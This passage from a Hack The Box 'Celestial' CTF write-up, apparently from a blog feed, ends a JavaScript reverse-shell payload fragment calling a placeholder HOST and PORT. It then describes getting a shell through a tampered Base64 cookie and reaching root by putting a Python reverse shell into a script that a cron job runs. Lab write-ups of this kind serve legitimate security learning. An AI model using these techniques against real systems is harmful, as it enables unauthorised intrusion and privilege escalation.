    &lt;span class="p"&gt;});&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="nx"&gt;c&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;HOST&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nx"&gt;PORT&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;After replacing my original cookie with the Base64 encoded tampered cookie, I got a reverse shell and the user flag.&lt;/p&gt;
&lt;p&gt;&lt;img alt="user" src="images/ctf/htb/celestial/user.png"&gt;&lt;/p&gt;
&lt;h2&gt;Privilege Escalation&lt;/h2&gt;
&lt;p&gt;Now I have access to the box as user &lt;code&gt;sun&lt;/code&gt;, who is part of the &lt;code&gt;sudo&lt;/code&gt; users group.  I did not attempt to see if there were any alternate paths.&lt;/p&gt;
&lt;p&gt;Of immediate interest was the file output.txt which has a creation time within the last 5- or 10-minute time increment and the contents &lt;code&gt;Script is running....&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;After some observation, the creation time increments every 5 minutes exactly, indicating an automated process. The contents of the file match the contents of the &lt;code&gt;echo "Script is running..."&lt;/code&gt; line from a file called &lt;code&gt;script.py&lt;/code&gt; under the &lt;code&gt;Documents/&lt;/code&gt; directory. Modifying the script to output a different string also modified the output files contents.&lt;/p&gt;
&lt;p&gt;I created a Python reverse shell and placed my code into script.py and set a listener on Kali. At the next 5-minute mark, my code executed and gave me another reverse shell and the root flag.&lt;/p&gt;
&lt;p&gt;&lt;img alt="root" src="images/ctf/htb/celestial/root.png"&gt;&lt;/p&gt;</content><category term="ctf"></category><category term="ctf"></category><category term="hack the box"></category></entry></feed>